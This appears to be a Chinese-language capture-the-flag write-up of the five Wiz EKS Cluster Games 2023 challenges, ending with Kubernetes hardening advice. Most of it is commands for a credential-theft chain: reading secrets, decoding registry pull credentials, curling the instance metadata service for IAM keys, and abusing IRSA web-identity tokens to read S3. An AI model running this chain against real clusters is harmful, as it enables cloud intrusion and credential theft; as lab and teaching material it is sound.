---
title: 从Wiz Cluster Games挑战赛漫谈K8s集群安全
contest: Wiz EKS Cluster Games 2023
year: 2023
difficulty: medium
vuln_type: auth_bypass
tags: [Kubernetes, EKS, RBAC, IRSA, imagePullSecrets, ECR, AWS, OIDC, service-account-token, 云安全]
attack_chain:
  - Challenge 1: RBAC 仅给 secrets get/list → kubectl get secret log-rotate -o json base64 解码
  - Challenge 2: pods list/get → kubectl get pod database-pod-2c9b3a4e -o yaml 找 imagePullSecrets
  - 拿 registry-pull-secrets dockerconfigjson base64 解 crane auth login index.docker.io
  - crane pull eksclustergames/base_ext_image 提 layer tar 找 flag.txt
  - Challenge 3: ECR 镜像 401 → IMDS 169.254.169.254/latest/meta-data/iam/security-credentials 拿 ASIA 临时凭证
  - aws ecr get-login-password docker login 拉 central_repo-aaf4a7c 镜像
  - docker history --no-trunc 翻 RUN 层泄 ARTIFACTORY_TOKEN 拿到 flag
  - Challenge 4: SA challenge4 无权 → IMDS 拿 NodeInstanceRole
  - aws eks get-token 拿 ExecCredential token → kubectl --token 读 secrets node-flag
  - Challenge 5: SA debug-sa IRSA 绑 challengeEksS3Role → kubectl create token debug-sa
  - aws sts assume-role-with-webidentity 拿 STS 临时凭证
  - aws s3 cp s3://challenge-flag-bucket-3ff1ae2/flag 拿 flag
key_payload: 'wiz_eks_challenge{*}'
one_liner: Wiz EKS 5 关云原生攻击链：RBAC 读 secret → imagePullSecrets 拉镜像 → IMDS 提 AWS 凭证 → ECR 历史泄密 → IRSA AssumeRoleWithWebIdentity 读 S3。
lesson: K8s 攻击面按 RBAC→Secrets→IMDS→IRSA 层层升级；aws sts get-caller-identity 是验证当前凭证的快捷命令；service-account-token + OIDC 是 K8s 1.24+ 标准姿势。
quality: high
---

# 从Wiz Cluster Games挑战赛漫谈K8s集群安全

## 概览
- **来源**: ctfiot 151534
- **赛事**: Wiz EKS Cluster Games 2023 (wiz.io 5 关 K8s 云挑战)
- **难度**: ⭐⭐⭐

## 5 关挑战

### Challenge 1 - secrets get/list
```bash
kubectl get secret log-rotate -o json
# data.flag = base64 → 解码
```

### Challenge 2 - pods list/get + imagePullSecrets
```bash
kubectl get pod database-pod-2c9b3a4e -o yaml
# spec.imagePullSecrets[0].name = registry-pull-secrets-780bab1d
kubectl get secret registry-pull-secrets-780bab1d -o json
# .dockerconfigjson base64 解
crane auth login index.docker.io -u eksclustergames -p dckr_pat_xxx
crane pull eksclustergames/base_ext_image /tmp/image.tar
tar xvf image.tar → flag.txt
```

### Challenge 3 - ECR + IMDS
```bash
curl 169.254.169.254/latest/meta-data/iam/security-credentials/eks-challenge-cluster-nodegroup-NodeInstanceRole
# 拿 ASIA + SecretAccessKey + SessionToken
aws ecr get-login-password | docker login --username AWS --password-stdin 688655246681.dkr.ecr...
sudo docker history --no-trunc <image>
# 翻 RUN 层泄 ARTIFACTORY_TOKEN=wiz_eks_challenge{xxx}
```

### Challenge 4 - IRSA + EKS GetToken
```bash
curl 169.254.169.254/latest/meta-data/iam/security-credentials/<NodeRole>
aws sts get-caller-identity  # 验证当前凭证
aws eks get-token --cluster-name eks-challenge-cluster
# 拿 k8s-aws-v1.aH... token
kubectl --token "$TOKEN" get secrets
kubectl get secret node-flag -o json  # 拿 flag
```

### Challenge 5 - AssumeRoleWithWebIdentity
```bash
# debug-sa 注解: eks.amazonaws.com/role-arn: arn:aws:iam::...:role/challengeEksS3Role
kubectl get sa debug-sa -o json
kubectl create token debug-sa  # 拿 JWT
aws sts assume-role-with-web-identity \
  --role-arn arn:aws:iam::688655246681:role/challengeEksS3Role \
  --role-session-name test --web-identity-token "$TOKEN"
# 拿 ASIA2AV... 临时凭证
aws s3 cp s3://challenge-flag-bucket-3ff1ae2/flag .
```

## 集群安全最佳实践
- 关闭 IMDSv1 强制 IMDSv2 (需要 token header)
- 最小化 RBAC
- imagePullSecrets 加密 (KMS/Secrets Manager)
- IRSA + eks-pod-identity 替代 kube2iam
- PodSecurity admission / OPA Gatekeeper
